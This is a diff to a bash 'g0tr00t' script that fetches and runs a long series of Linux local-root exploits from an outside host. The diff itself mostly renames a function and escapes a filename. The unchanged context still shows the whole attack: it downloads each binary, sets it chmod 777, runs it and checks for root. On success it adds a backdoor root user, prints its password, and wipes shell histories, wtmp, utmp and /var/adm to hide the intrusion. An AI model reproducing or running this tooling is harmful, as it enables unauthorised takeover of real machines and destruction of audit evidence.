@@ -1,6 +1,6 @@
 #!/bin/bash
 
-fcheckroot()
+fcheckr00t()
 {
 	echo " [*] Downloading exploit No. $CNT.."
 	if [ $(whoami) = 'root' ] 2> /dev/null
@@ -8,7 +8,7 @@ fcheckroot()
 		echo " [*] g0tr00t with exploit No. $CNT"
 		GOTROOT=1
 	else
-		echo " [*] Failed to g0tr00t with expolit No. $CNT"
+		echo " [*] Failed to g0tr00t with exploit No. $CNT"
 		CNT=$((CNT + 1))
 	fi
 }
@@ -49,7 +49,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -63,7 +63,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -77,7 +77,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -91,7 +91,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -105,7 +105,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -119,7 +119,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -133,7 +133,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -147,7 +147,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -161,7 +161,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -175,7 +175,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -189,7 +189,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -203,7 +203,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -217,7 +217,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -231,7 +231,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -245,7 +245,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -259,7 +259,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -273,7 +273,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -287,7 +287,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -301,7 +301,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -315,7 +315,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -329,7 +329,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -343,7 +343,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -357,7 +357,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -371,7 +371,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -385,7 +385,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -399,7 +399,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -413,7 +413,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -427,7 +427,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -441,7 +441,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -455,7 +455,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -469,7 +469,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -483,7 +483,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -497,7 +497,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -511,7 +511,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -525,7 +525,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -539,7 +539,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -553,7 +553,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -567,7 +567,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -581,7 +581,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -595,7 +595,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -609,7 +609,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -623,7 +623,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -637,7 +637,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -651,7 +651,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -665,7 +665,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -679,7 +679,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -693,7 +693,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -707,7 +707,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -721,7 +721,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -735,7 +735,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -749,7 +749,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -763,7 +763,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -777,7 +777,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -791,7 +791,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -805,7 +805,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -819,7 +819,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -833,7 +833,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -847,7 +847,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -861,7 +861,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -875,7 +875,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -889,7 +889,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -903,7 +903,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -917,7 +917,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -931,7 +931,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -945,7 +945,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -959,7 +959,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -973,7 +973,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -987,7 +987,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1001,7 +1001,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1015,7 +1015,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1029,7 +1029,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1043,7 +1043,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1057,7 +1057,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1071,21 +1071,21 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
 then
-	$DLER http://bie.nazuka.net/localroot/2011 LocalRoot\ For\ 2.6.18-128.el5
+	$DLER http://bie.nazuka.net/localroot/2011\ LocalRoot\ For\ 2.6.18-128.el5
 	if [ $CURLIT -z ] 2> /dev/null
 	then
-		chmod 777 2011 LocalRoot\ For\ 2.6.18-128.el5
-		./2011 LocalRoot\ For\ 2.6.18-128.el5
+		chmod 777 2011\ LocalRoot\ For\ 2.6.18-128.el5
+		./2011\ LocalRoot\ For\ 2.6.18-128.el5
 	else
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1099,7 +1099,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1113,7 +1113,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1127,7 +1127,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1141,7 +1141,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1155,7 +1155,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1169,7 +1169,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1183,7 +1183,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1197,7 +1197,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1211,7 +1211,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1225,7 +1225,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1239,7 +1239,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1253,7 +1253,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1267,7 +1267,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1281,7 +1281,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1295,7 +1295,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1309,7 +1309,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1323,7 +1323,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1337,7 +1337,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1351,7 +1351,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1365,7 +1365,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1379,7 +1379,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1393,7 +1393,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1407,7 +1407,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1421,7 +1421,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1435,7 +1435,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1449,7 +1449,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1463,7 +1463,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1477,7 +1477,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1491,7 +1491,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1505,7 +1505,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1519,7 +1519,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1533,7 +1533,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1547,7 +1547,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1561,7 +1561,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1575,7 +1575,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1589,7 +1589,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1603,7 +1603,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1617,7 +1617,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1631,7 +1631,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1645,7 +1645,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1659,7 +1659,7 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 if [ $GOTROOT -z ] 2> /dev/null
@@ -1673,11 +1673,14 @@ then
 		chmod 777 hisetup
 		./hisetup
 	fi
-	fcheckroot
+	fcheckr00t
 fi
 
 cd ..
 rm -rf exploits
+CNT=''
+DLER=''
+CURLIT=''
 
 if [ $GOTROOT = 1 ] 2> /dev/null
 then
@@ -1689,6 +1692,9 @@ then
 	echo " [*] Added r00t user: $RUSER"
 	echo " [*] p455w0rd:  $RPASS"
 	echo " [*] Clearing logs.."
+	RPASS=''
+	RUSER=''
+	GOTROOT=''
 	rm -rf /tmp/logs 2> /dev/null
 	rm -rf /root/.ksh_history 2> /dev/null
 	rm -rf /root/.bash_history 2> /dev/null
@@ -1703,7 +1709,6 @@ then
 	rm -rf /var/adm 2> /dev/null
 	rm -rf /etc/wtmp 2> /dev/null
 	rm -rf /etc/utmp 2> /dev/null
-	GOTROOT=''
 	echo " [*] You g0tr00t, horray for you..."
 	whoami
 	id
